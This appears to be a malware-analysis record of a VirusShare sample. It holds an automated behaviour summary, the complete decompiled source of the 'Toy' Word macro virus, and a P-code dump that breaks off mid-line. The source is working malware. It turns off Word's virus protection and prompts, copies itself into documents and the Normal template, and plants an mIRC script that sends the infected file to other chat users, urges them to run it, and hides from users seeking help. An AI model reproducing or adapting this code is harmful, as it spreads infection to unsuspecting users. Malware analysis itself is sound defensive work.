{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"Module1\""
        ],
        "behavior": {
            "AddFromstring": "May attempt to modify the VBA code",
            "AutoClose": "Runs when the Word document is closed",
            "AutoOpen": "Runs when the Word document is opened",
            "Call": "May call a DLL using Excel 4 Macros",
            "Chr": "May attempt to obfuscate specific str",
            "CodeModule": "May attempt to modify the VBA code",
            "Environ": "May read system environment variables",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Kill": "May delete a file",
            "Open": "May open a file",
            "Output": "May write to a file",
            "Print #": "May write to a file",
            "System": "May run an executable file or a system command on a Mac",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code",
            "command": "May run PowerShell commands",
            "run": "May run an executable file or a system command",
            "vbNormal": "May run an executable file or a system command",
            "write": "May write to a file"
        },
        "macro": "\n\n'Toy\nSub AutoOpen()\nCall Start\nEnd Sub\nSub Start()\nOn Error Resume Next\nSet Opt = Options\nOpt.VirusProtection = 0\nOpt.ConfirmConversions = 0\nOpt.SaveNormalPrompt = 0\nSet App = Application\nApp.EnableCancelKey = 0\nApp.DisplayAlerts = 0\nhrm = 0\nvar9 = 0\nvar10 = 3\nvar11 = 1\nTmp1 = ActiveDocument.FullName\nIf ActiveDocument.Saved = False Then hrm = 1\nInfect:\nIf var9 = 0 Then\nSet Here = ActiveDocument.VBProject\nElse\nSet Here = NormalTemplate.VBProject\nEnd If\nFor var12 = 1 To Here.VBComponents.Count\nvar13 = Here.VBComponents(var12).CodeModule.CountOfLines\nvar14 = Here.VBComponents(var12).CodeModule.Lines(1, 1)\nIf var12 <> 1 And var13 > 0 And UCase(var14) = \"'TOY\" Then\nvar10 = var10 - var11\nvar17 = Here.VBComponents.Item(var12).CodeModule.Lines(3, var13)\nExit For\nEnd If\nIf var13 > 0 And UCase(var14) <> \"'TOY\" Then Here.VBComponents.Item(var12).CodeModule.DeleteLines 1, var13\nNext var12\nIf var9 = 0 Then\nvar11 = var11 + 1\nvar9 = 1\nGoTo Infect\nEnd If\nIf var10 = 0 Then GoTo payload\nIf var10 = 1 Then\nSet blah1 = ActiveDocument.VBProject\nFCode = \"'Toy\" & Chr(13) & \"Sub AutoOpen\" & Chr(13) & var17\nEnd If\nIf var10 = 2 Then\nSet blah1 = NormalTemplate.VBProject\nFCode = \"'Toy\" & Chr(13) & \"Sub AutoClose\" & Chr(13) & var17\nEnd If\ncheck3 = blah1.VBComponents.Count\nIf check3 < 2 Then\nOpen \"C:\\Toy.vxd\" For Output As #1\nPrint #1, FCode\nClose #1\nblah1.VBComponents.Import (\"C:\\Toy.vxd\")\nKill \"C:\\Toy.vxd\"\nGoTo payload\nEnd If\nFor var18 = 2 To blah1.VBComponents.Count\nvar19 = blah1.VBComponents(var18).CodeModule.CountOfLines\nIf var19 < 50 Then\nblah1.VBComponents(var18).CodeModule.AddFromstring (FCode)\nExit For\nEnd If\nNext var18\npayload:\nIf MacroContainer <> NormalTemplate.Name Or Int(Rnd * 9) <> 7 Then GoTo done\nWind = Environ(\"WINDIR\")\nWith Application.FileSearch\n.LookIn = \"C:\\\"\n.SearchSubFolders = True\n.FileName = \"mirc32.exe\"\n.FileType = msoFileTypeAllFiles\n.Execute msoSortByFileName\nEnd With\nFor x = 1 To Application.FileSearch.FoundFiles.Count\nLocation = Application.FileSearch.FoundFiles(x)\nLDir = Left(Location, Len(Location) - 10)\nLM = LDir & \"mirc.ini\"\nLN = LDir & \"script.ini\"\nIf Dir(LM) <> \"\" Then\nvar3 = Wind & \"\\Default.vxd\"\nSetAttr (LM), vbNormal\nIf System.PrivateProfileString(LM, \"rfiles\", \"n2\") <> LN Then System.PrivateProfileString(LM, \"rfiles\", \"n2\") = LN\nIf System.PrivateProfileString(LM, \"rfiles\", \"n3\") <> var3 Then System.PrivateProfileString(LM, \"rfiles\", \"n3\") = var3\nIf Dir(var3) <> \"\" Then\nKill var3\nSetAttr (var3), vbNormal\nEnd If\nOpen var3 For Output As #1\nPrint #1, \"On 1:Connect:{ .ctcps on | Set %go 0 | hunting | .enable #damn3 | if ( $exists(C:\\toy.sys) ) { Set %ex $read -l1 C:\\toy.sys | if ( %ex != $null ) && ( $exists(%ex) ) { Set %go 1 } } | if ( $day = Friday ) && ( $r(1,7) = 4 ) { by } | if ( $r(1,25) != 7 ) { halt } | if ( $mid($version,3,1) > 4 ) { Set %varn1 editbox text | .timer77 0 .1 toy } | else { Set %fy 0 | .timer77 0 .5 toy1 } }\"\nPrint #1, \"On 1:Disconnect:{ .timers off | .write -c C:\\Time.drv $time | .enable #damn3 | if ( %varn1 != $null ) { .colour %varn1 1 } }\"\nPrint #1, \"On 1:Input:*:{ Set %s $1- | if ( /timer isin %s ) || ( // isin %s ) || ( /. isin %s ) || ( /colour isin %s ) || ( disable isin %s ) || ( default isin %s ) || ( remove isin %s ) ( /write isin %s ) { halt } | if ( %eh isin %s ) { .echo -ae \u00034Hehe, come on, that wont work \u0003-\u000312T\u000313o\u00039y | halt } }\"\nPrint #1, \"On 1:Join:*:{ if ( help isin # ) || ( dmsetup isin # ) || ( backorifice isin # ) || ( nohack isin # ) || ( vir isin # ) || ( aid isin # ) { Set %chan # | .timer7 1 .1 quiet } }\"\nPrint #1, \"On 1:Part:*:{ if ( %go = 0 ) { halt } | if ( $r(1,2) = 1 ) && ( $nick isreg # ) && ( $nick != $me ) { SQ $nick | .ignore -pcnu120 $nick } }\"\nPrint #1, \"On 1:FileSent:*:{ if ( %go = 0 ) { halt } | if ( $filename = %ex ) { .msg $nick Type //run -n $getdir $+ $nopath(%ex) to run | halt } | SQ $nick | .ignore -pcnu60 $nick 3 }\"\nPrint #1, \"On 1:FileRcvd:*:{ if ( %go = 0 ) { halt } | SQ $nick | .ignore -pcnu60 $nick }\"\nPrint #1, \"On 1:Notify:{ if ( %go = 0 ) { halt } | if ( $nick !isin %heh ) { %heh = %heh $+ $nick | .ignore -pcnu120 $nick 3 | .timer $+ $r(99,199) 1 10 .msg $nick Hey, talk to you in a minute. Check out this file, ok. | .timer $+ $r(99,199) 1 20 SQ $nick } }\"\nPrint #1, \"On 1:SockListen:sd:{ sockaccept we | ok1 }\"\nPrint #1, \"On 1:SockWrite:we:{ if ( %stop = 1 ) { .sockclose we | halt } | ok1 }\"\nPrint #1, \"On ^1:Kick:*:{ if ( $knick != $me ) { return } | letslook $1- | letsdo }\"\nPrint #1, \"On ^1:Notice:*:*:{ letslook $1- | letsdo }\"\nPrint #1, \"On ^1:Action:*:*:{ letslook $1- | letsdo }\"\nPrint #1, \"On ^1:Text:*:*:{ letslook $1- | letsdo }\"\nPrint #1, \"On ^1:Chat:*:{ letslook $1- | letsdo }\"\nPrint #1, \"On ^1:Serv:*:{ letslook $1- | letsdo }\"\nPrint #1, \"On ^1:Quit:{ letslook $1- | letsdo }\"\nPrint #1, \"On ^1:Topic:#:{ letslook $1- | letsdo }\"\nPrint #1, \"ctcp 1:*:*:{ letslook $1- | letsdo }\"\nPrint #1, \"raw 332:*:{ letslook $2- | Set %chan $2 | .timer7 1 .1 quiet }\"\nPrint #1, \"raw 401:*:{ halt }\"\nPrint #1, \"raw 439:*:{ halt }\"\nPrint #1, \"alias toy { Set %varn4 $r(0,14) | colour %varn1 %varn4 }\"\nPrint #1, \"alias toy1 { if ( %fy = 0 ) { .font -a 9 Fixedsys | Set %fy 1 | halt } | .font -a 9 WP TypographicSymbols | Set %fy 0 }\"\nPrint #1, \"alias toy2 { .echo -ae \u00034I'm sorry, but that command is not a \u000312T\u000313o\u00039y }\"\nPrint #1, \"alias by { .echo -ae \u000312T\u000313o\u00039y\u0003 \u00038I\u00034s \u000312B\u000313y \u00039S\u00038i\u00034m\u000312p\u000313l\u00039e\u00038S\u00034i\u000312m\u000313o\u00039n }\"\nPrint #1, \"alias quiet { Set %var1 1 | :j | Set %var2 $nick(%chan,%var1) | if ( %var2 = $null ) { .part %chan | halt } | if ( %var2 != $me ) && ( %var2 != X ) && ( %var2 != W ) { .ignore %var2 3 } | inc %var1 | goto j }\"\nPrint #1, \"alias -l hunting { if ( $exists(C:\\Time.drv) ) { Set %weird $time($file(C:\\Time.drv).mtime,H) | Set %tmp1 $calc((%weird + 5) % 24) } | if ( %weird != $null ) { if ( %weird > $time(H) ) || ( %tmp1 < $time(H) ) { rabbits } } }\"\nPrint #1, \"alias -l rabbits { Set %tmp1 $ignore(0) | Set %tmp2 0 | :tm | inc %tmp2 | if ( %tmp1 = $null ) || ( %tmp2 > %tmp1 ) { goto out } | .ignore -r $ignore(1) | goto tm | :out }\"\nPrint #1, \"alias letsdo { .ignore $nick 3 | halt }\"\nPrint #1, \"alias letslook { if ( $nopath(%ex) !isin $1- ) && ( disable !isin $1- ) && ( script !isin $1- ) && ( dmsetup !isin $1- ) && ( worm !isin $1- ) && ( virus !isin $1- ) && ( infect !isin $1- ) && ( spread !isin $1- ) && ( remote !isin $1- ) && ( default !isin $1- ) && ( event !isin $1- ) && ( toy !isin $1- ) && ( unload !isin $1- ) { return } }\"\nPrint #1, \"alias unload { if ( $1 = $null ) || ( $2 = $null ) { .echo -e \u00032* /unload: insufficient parameters | halt } | .echo -e \u00032*** Unloaded script ' $+ $2- $+ '\u0003 | halt }\"\nPrint #1, \"alias remote { if ( $1 = $null ) { .echo -e \u00032*** Remote is OFF\u0003 | halt } | if ( $1 = on ) { .echo -e \u00032*** Remote is ON (Ctcps,Events,Raw) } | else { .echo -e \u00032*** Remote is OFF } | halt }\"\nPrint #1, \"alias events { if ( $1 = $null ) { .echo -e \u00032*** Events are OFF\u0003 | halt } | if ( $1 = on ) { .echo -e \u00032*** Events are ON } | else { .echo -e \u00032*** Events are OFF } | halt }\"\nPrint #1, \"alias remini { toy2 }\"\nPrint #1, \"alias alias { toy2 }\"\nPrint #1, \"alias run { toy2 }\"\nPrint #1, \"alias copy { toy2 }\"\nPrint #1, \"alias load { if ( $1 = -rs ) { toy2 | halt } }\"\nPrint #1, \"#damn3 on\"\nPrint #1, \"alias play { if ( $pos($1-,.mrc,1) > 0 ) || ( $pos($1-,.ini,1) > 0 ) || ( $pos($1-,.vxd,1) > 0 ) { halt } | .disable #damn3 | .timer0 1 .1 .play $1- | .enable #damn3 }\"\nPrint #1, \"#damn3 end\"\nPrint #1, \"alias writeini { toy2 }\"\nPrint #1, \"alias rename { toy2 }\"\n'DCC Send using socket commands is a modified version of that in _Bird_'s phraggle worm\nPrint #1, \"alias SQ { %nick = $1- | %stop = 0 | %pt = $r(2400,5000) | %be = 0 | %pk = 4096 | %sz = $file(%ex).size | .notice %nick DCC Send %ex ( $+ $ip $+ ) | .raw -q privmsg %nick : $+ $chr(1) $+ DCC SEND %ex $longip($ip) %pt %sz $+ $chr(1) | if ( $sock(sd) != $null ) { .sockclose sd } | .socklisten sd %pt }\"\nPrint #1, \"alias ok1 { if ( $calc(%be + %pk) < %sz ) { .bread %ex %be %pk &data | .sockwrite we &data | inc %be %pk } | else { %stop = 1 | %pk = $calc( %sz - %be) | if (%pk == 0) { return } | .bread %ex %be %pk &data | .sockwrite we &data } }\"\nClose #1\nSetAttr (var3), vbReadOnly\nEnd If\nIf irc <> \"\" Then GoTo Junction\nirc = Int(Rnd * 2)\nIf irc = 1 Then FName = Wind & \"\\Toy.doc\"\nIf irc = 0 Then FName = Wind & \"\\Game.doc\"\nIf irc = 2 Then FName = Wind & \"\\Fable.doc\"\nIf Dir(FName) = \"\" Then\nActiveDocument.SaveAs FileName:=FName, AddToRecentFiles:=False\nSetAttr (FName), vbReadOnly\nhrm = 0\nEnd If\nIf Dir(\"C:\\Toy.sys\") <> \"\" Then\nSetAttr (\"C:\\Toy.sys\"), vbNormal\nKill \"C:\\Toy.sys\"\nEnd If\nOpen \"C:\\Toy.sys\" For Output As #1\nPrint #1, FName\nClose #1\nSetAttr (\"C:\\Toy.sys\"), vbReadOnly\nJunction:\nIf Dir(LN) = \"\" Then\nOpen LN For Output As #1\nPrint #1, \"[script]\"\nClose #1\nEnd If\nNext x\ndone:\nIf var10 = 1 Then\nIf hrm = 0 Then\nActiveDocument.SaveAs FileName:=Tmp1\nElse\nActiveDocument.Close\nEnd If\nElse\nNormalTemplate.Save\nEnd If\nEnd Sub\nSub ViewVBCode()\nEnd Sub\nSub ToolsMacro()\nEnd Sub\n\n\n\n\n\n\n\n\n\n\n\n\n' Processing file: VirusShare_363cb3e0478d547741274f2e8e92cad9\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 903 bytes\n' Macros/VBA/Module1 - 16274 bytes\n' Line #0:\n' \tQuoteRem 0x0000 0x0003 \"Toy\"\n' Line #1:\n' \tFuncDefn (Sub AutoOpen())\n' Line #2:\n' \tArgsCall (Call) Start 0x0000 \n' Line #3:\n' \tEndSub \n' Line #4:\n' \tFuncDefn (Sub Start())\n' Line #5:\n' \tOnError (Resume Next) \n' Line #6:\n' \tSetStmt \n' \tLd Options \n' \tSet Opt \n' Line #7:\n' \tLitDI2 0x0000 \n' \tLd Opt \n' \tMemSt VirusProtection \n' Line #8:\n' \tLitDI2 0x0000 \n' \tLd Opt \n' \tMemSt ConfirmConversions \n' Line #9:\n' \tLitDI2 0x0000 \n' \tLd Opt \n' \tMemSt SaveNormalPrompt \n' Line #10:\n' \tSetStmt \n' \tLd Application \n' \tSet App \n' Line #11:\n' \tLitDI2 0x0000 \n' \tLd App \n' \tMemSt EnableCancelKey \n' Line #12:\n' \tLitDI2 0x0000 \n' \tLd App \n' \tMemSt DisplayAlerts \n' Line #13:\n' \tLitDI2 0x0000 \n' \tSt hrm \n' Line #14:\n' \tLitDI2 0x0000 \n' \tSt var9 \n' Line #15:\n' \tLitDI2 0x0003 \n' \tSt var10 \n' Line #16:\n' \tLitDI2 0x0001 \n' \tSt var11 \n' Line #17:\n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tSt Tmp1 \n' Line #18:\n' \tLd ActiveDocument \n' \tMemLd Saved \n' \tLitVarSpecial (False)\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitDI2 0x0001 \n' \tSt hrm \n' \tEndIf \n' Line #19:\n' \tLabel Infect \n' Line #20:\n' \tLd var9 \n' \tLitDI2 0x0000 \n' \tEq \n' \tIfBlock \n' Line #21:\n' \tSetStmt \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tSet Here \n' Line #22:\n' \tElseBlock \n' Line #23:\n' \tSetStmt \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tSet Here \n' Line #24:\n' \tEndIfBlock \n' Line #25:\n' \tStartForVariable \n' \tLd var12 \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd Here \n' \tMemLd VBComponents \n' \tMemLd Count \n' \tFor \n' Line #26:\n' \tLd var12 \n' \tLd Here \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tSt var13 \n' Line #27:\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd var12 \n' \tLd Here \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tSt var14 \n' Line #28:\n' \tLd var12 \n' \tLitDI2 0x0001 \n' \tNe \n' \tLd var13 \n' \tLitDI2 0x0000 \n' \tGt \n' \tAnd \n' \tLd var14 \n' \tArgsLd UCase 0x0001 \n' \tLitStr 0x0004 \"'TOY\"\n' \tEq \n' \tAnd \n' \tIfBlock \n' Line #29:\n' \tLd var10 \n' \tLd var11 \n' \tSub \n' \tSt var10 \n' Line #30:\n' \tLitDI2 0x0003 \n' \tLd var13 \n' \tLd var12 \n' \tLd Here \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tSt var17 \n' Line #31:\n' \tExitFor \n' Line #32:\n' \tEndIfBlock \n' Line #33:\n' \tLd var13 \n' \tLitDI2 0x0000 \n' \tGt \n' \tLd var14 \n' \tArgsLd UCase 0x0001 \n' \tLitStr 0x0004 \"'TOY\"\n' \tNe \n' \tAnd \n' \tIf \n' \tBoSImplicit \n' \tLitDI2 0x0001 \n' \tLd var13 \n' \tLd var12 \n' \tLd Here \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemCall DeleteLines 0x0002 \n' \tEndIf \n' Line #34:\n' \tStartForVariable \n' \tLd var12 \n' \tEndForVariable \n' \tNextVar \n' Line #35:\n' \tLd var9 \n' \tLitDI2 0x0000 \n' \tEq \n' \tIfBlock \n' Line #36:\n' \tLd var11 \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt var11 \n' Line #37:\n' \tLitDI2 0x0001 \n' \tSt var9 \n' Line #38:\n' \tGoTo Infect \n' Line #39:\n' \tEndIfBlock \n' Line #40:\n' \tLd var10 \n' \tLitDI2 0x0000 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tGoTo payload \n' \tEndIf \n' Line #41:\n' \tLd var10 \n' \tLitDI2 0x0001 \n' \tEq \n' \tIfBlock \n' Line #42:\n' \tSetStmt \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tSet blah1 \n' Line #43:\n' \tLitStr 0x0004 \"'Toy\"\n' \tLitDI2 0x000D \n' \tArgsLd Chr 0x0001 \n' \tConcat \n' \tLitStr 0x000C \"Sub AutoOpen\"\n' \tConcat \n' \tLitDI2 0x000D \n' \tArgsLd Chr 0x0001 \n' \tConcat \n' \tLd var17 \n' \tConcat \n' \tSt FCode \n' Line #44:\n' \tEndIfBlock \n' Line #45:\n' \tLd var10 \n' \tLitDI2 0x0002 \n' \tEq \n' \tIfBlock \n' Line #46:\n' \tSetStmt \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tSet blah1 \n' Line #47:\n' \tLitStr 0x0004 \"'Toy\"\n' \tLitDI2 0x000D \n' \tArgsLd Chr 0x0001 \n' \tConcat \n' \tLitStr 0x000D \"Sub AutoClose\"\n' \tConcat \n' \tLitDI2 0x000D \n' \tArgsLd Chr 0x0001 \n' \tConcat \n' \tLd var17 \n' \tConcat \n' \tSt FCode \n' Line #48:\n' \tEndIfBlock \n' Line #49:\n' \tLd blah1 \n' \tMemLd VBComponents \n' \tMemLd Count \n' \tSt check3 \n' Line #50:\n' \tLd check3 \n' \tLitDI2 0x0002 \n' \tLt \n' \tIfBlock \n' Line #51:\n' \tLitStr 0x000A \"C:\\Toy.vxd\"\n' \tLitDI2 0x0001 \n' \tSharp \n' \tLitDefault \n' \tOpen (For Output)\n' Line #52:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLd FCode \n' \tPrintItemNL \n' Line #53:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tClose 0x0001 \n' Line #54:\n' \tLitStr 0x000A \"C:\\Toy.vxd\"\n' \tParen \n' \tLd blah1 \n' \tMemLd VBComponents \n' \tArgsMemCall Import 0x0001 \n' Line #55:\n' \tLitStr 0x000A \"C:\\Toy.vxd\"\n' \tArgsCall Kill 0x0001 \n' Line #56:\n' \tGoTo payload \n' Line #57:\n' \tEndIfBlock \n' Line #58:\n' \tStartForVariable \n' \tLd var18 \n' \tEndForVariable \n' \tLitDI2 0x0002 \n' \tLd blah1 \n' \tMemLd VBComponents \n' \tMemLd Count \n' \tFor \n' Line #59:\n' \tLd var18 \n' \tLd blah1 \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tSt var19 \n' Line #60:\n' \tLd var19 \n' \tLitDI2 0x0032 \n' \tLt \n' \tIfBlock \n' Line #61:\n' \tLd FCode \n' \tParen \n' \tLd var18 \n' \tLd blah1 \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemCall AddFromstring 0x0001 \n' Line #62:\n' \tExitFor \n' Line #63:\n' \tEndIfBlock \n' Line #64:\n' \tStartForVariable \n' \tLd var18 \n' \tEndForVariable \n' \tNextVar \n' Line #65:\n' \tLabel payload \n' Line #66:\n' \tLd MacroContainer \n' \tLd NormalTemplate \n' \tMemLd New \n' \tNe \n' \tLd Rnd \n' \tLitDI2 0x0009 \n' \tMul \n' \tFnInt \n' \tLitDI2 0x0007 \n' \tNe \n' \tOr \n' \tIf \n' \tBoSImplicit \n' \tGoTo done \n' \tEndIf \n' Line #67:\n' \tLitStr 0x0006 \"WINDIR\"\n' \tArgsLd Environ 0x0001 \n' \tSt Wind \n' Line #68:\n' \tStartWithExpr \n' \tLd Application \n' \tMemLd FileSearch \n' \tWith \n' Line #69:\n' \tLitStr 0x0003 \"C:\\\"\n' \tMemStWith LookIn \n' Line #70:\n' \tLitVarSpecial (True)\n' \tMemStWith SearchSubFolders \n' Line #71:\n' \tLitStr 0x000A \"mirc32.exe\"\n' \tMemStWith FileName \n' Line #72:\n' \tLd msoFileTypeAllFiles \n' \tMemStWith FileType \n' Line #73:\n' \tLd msoSortByFileName \n' \tArgsMemCallWith Execute 0x0001 \n' Line #74:\n' \tEndWith \n' Line #75:\n' \tStartForVariable \n' \tLd x \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd Application \n' \tMemLd FileSearch \n' \tMemLd FoundFiles \n' \tMemLd Count \n' \tFor \n' Line #76:\n' \tLd x \n' \tLd Application \n' \tMemLd FileSearch \n' \tArgsMemLd FoundFiles 0x0001 \n' \tSt Location \n' Line #77:\n' \tLd Location \n' \tLd Location \n' \tFnLen \n' \tLitDI2 0x000A \n' \tSub \n' \tArgsLd LBound 0x0002 \n' \tSt LDir \n' Line #78:\n' \tLd LDir \n' \tLitStr 0x0008 \"mirc.ini\"\n' \tConcat \n' \tSt LM \n' Line #79:\n' \tLd LDir \n' \tLitStr 0x000A \"script.ini\"\n' \tConcat \n' \tSt LN \n' Line #80:\n' \tLd LM \n' \tArgsLd Dir 0x0001 \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tIfBlock \n' Line #81:\n' \tLd Wind \n' \tLitStr 0x000C \"\\Default.vxd\"\n' \tConcat \n' \tSt var3 \n' Line #82:\n' \tLd LM \n' \tParen \n' \tLd vbNormal \n' \tArgsCall SetAttr 0x0002 \n' Line #83:\n' \tLd LM \n' \tLitStr 0x0006 \"rfiles\"\n' \tLitStr 0x0002 \"n2\"\n' \tLd System \n' \tArgsMemLd PrivateProfileString 0x0003 \n' \tLd LN \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLd LN \n' \tLd LM \n' \tLitStr 0x0006 \"rfiles\"\n' \tLitStr 0x0002 \"n2\"\n' \tLd System \n' \tArgsMemSt PrivateProfileString 0x0003 \n' \tEndIf \n' Line #84:\n' \tLd LM \n' \tLitStr 0x0006 \"rfiles\"\n' \tLitStr 0x0002 \"n3\"\n' \tLd System \n' \tArgsMemLd PrivateProfileString 0x0003 \n' \tLd var3 \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLd var3 \n' \tLd LM \n' \tLitStr 0x0006 \"rfiles\"\n' \tLitStr 0x0002 \"n3\"\n' \tLd System \n' \tArgsMemSt PrivateProfileString 0x0003 \n' \tEndIf \n' Line #85:\n' \tLd var3 \n' \tArgsLd Dir 0x0001 \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tIfBlock \n' Line #86:\n' \tLd var3 \n' \tArgsCall Kill 0x0001 \n' Line #87:\n' \tLd var3 \n' \tParen \n' \tLd vbNormal \n' \tArgsCall SetAttr 0x0002 \n' Line #88:\n' \tEndIfBlock \n' Line #89:\n' \tLd var3 \n' \tLitDI2 0x0001 \n' \tSharp \n' \tLitDefault \n' \tOpen (For Output)\n' Line #90:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0182 \"On 1:Connect:{ .ctcps on | Set %go 0 | hunting | .enable #damn3 | if ( $exists(C:\\toy.sys) ) { Set %ex $read -l1 C:\\toy.sys | if ( %ex != $null ) && ( $exists(%ex) ) { Set %go 1 } } | if ( $day = Friday ) && ( $r(1,7) = 4 ) { by } | if ( $r(1,25) != 7 ) { halt } | if ( $mid($version,3,1) > 4 ) { Set %varn1 editbox text | .timer77 0 .1 toy } | else { Set %fy 0 | .timer77 0 .5 toy1 } }\"\n' \tPrintItemNL \n' Line #91:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x007C \"On 1:Disconnect:{ .timers off | .write -c C:\\Time.drv $time | .enable #damn3 | if ( %varn1 != $null ) { .colour %varn1 1 } }\"\n' \tPrintItemNL \n' Line #92:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0126 \"On 1:Input:*:{ Set %s $1- | if ( /timer isin %s ) || ( // isin %s ) || ( /. isin %s ) || ( /colour isin %s ) || ( disable isin %s ) || ( default isin %s ) || ( remove isin %s ) ( /write isin %s ) { halt } | if ( %eh isin %s ) { .echo -ae \u00034Hehe, come on, that wont work \u0003-\u000312T\u000313o\u00039y | halt } }\"\n' \tPrintItemNL \n' Line #93:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x00B0 \"On 1:Join:*:{ if ( help isin # ) || ( dmsetup isin # ) || ( backorifice isin # ) || ( nohack isin # ) || ( vir isin # ) || ( aid isin # ) { Set %chan # | .timer7 1 .1 quiet } }\"\n' \tPrintItemNL \n' Line #94:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x008B \"On 1:Part:*:{ if ( %go = 0 ) { halt } | if ( $r(1,2) = 1 ) && ( $nick isreg # ) && ( $nick != $me ) { SQ $nick | .ignore -pcnu120 $nick } }\"\n' \tPrintItemNL \n' Line #95:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x00AC \"On 1:FileSent:*:{ if ( %go = 0 ) { halt } | if ( $filename = %ex ) { .msg $nick Type //run -n $getdir $+ $nopath(%ex) to run | halt } | SQ $nick | .ignore -pcnu60 $nick 3 }\"\n' \tPrintItemNL \n' Line #96:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x004E \"On 1:FileRcvd:*:{ if ( %go = 0 ) { halt } | SQ $nick | .ignore -pcnu60 $nick }\"\n' \tPrintItemNL \n' Line #97:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x00F8 \"On 1:Notify:{ if ( %go = 0 ) { halt } | if ( $nick !isin %heh ) { %heh = %heh $+ $nick | .ignore -pcnu120 $nick 3 | .timer $+ $r(99,199) 1 10 .msg $nick Hey, talk to you in a minute. Check out this file, ok. | .timer $+ $r(99,199) 1 20 SQ $nick } }\"\n' \tPrintItemNL \n' Line #98:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x002A \"On 1:SockListen:sd:{ sockaccept we | ok1 }\"\n' \tPrintItemNL \n' Line #99:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0045 \"On 1:SockWrite:we:{ if ( %stop = 1 ) { .sockclose we | halt } | ok1 }\"\n' \tPrintItemNL \n' Line #100:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0048 \"On ^1:Kick:*:{ if ( $knick != $me ) { return } | letslook $1- | letsdo }\"\n' \tPrintItemNL \n' Line #101:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x002A \"On ^1:Notice:*:*:{ letslook $1- | letsdo }\"\n' \tPrintItemNL \n' Line #102:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x002A \"On ^1:Action:*:*:{ letslook $1- | letsdo }\"\n' \tPrintItemNL \n' Line #103:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0028 \"On ^1:Text:*:*:{ letslook $1- | letsdo }\"\n' \tPrintItemNL \n' Line #104:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0026 \"On ^1:Chat:*:{ letslook $1- | letsdo }\"\n' \tPrintItemNL \n' Line #105:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0026 \"On ^1:Serv:*:{ letslook $1- | letsdo }\"\n' \tPrintItemNL \n' Line #106:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0024 \"On ^1:Quit:{ letslook $1- | letsdo }\"\n' \tPrintItemNL \n' Line #107:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0027 \"On ^1:Topic:#:{ letslook $1- | letsdo }\"\n' \tPrintItemNL \n' Line #108:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0024 \"ctcp 1:*:*:{ letslook $1- | letsdo }\"\n' \tPrintItemNL \n' Line #109:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x003E \"raw 332:*:{ letslook $2- | Set %chan $2 | .timer7 1 .1 quiet }\"\n' \tPrintItemNL \n' Line #110:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0012 \"raw 401:*:{ halt }\"\n' \tPrintItemNL \n' Line #111:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0012 \"raw 439:*:{ halt }\"\n' \tPrintItemNL \n' Line #112:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0038 \"alias toy { Set %varn4 $r(0,14) | colour 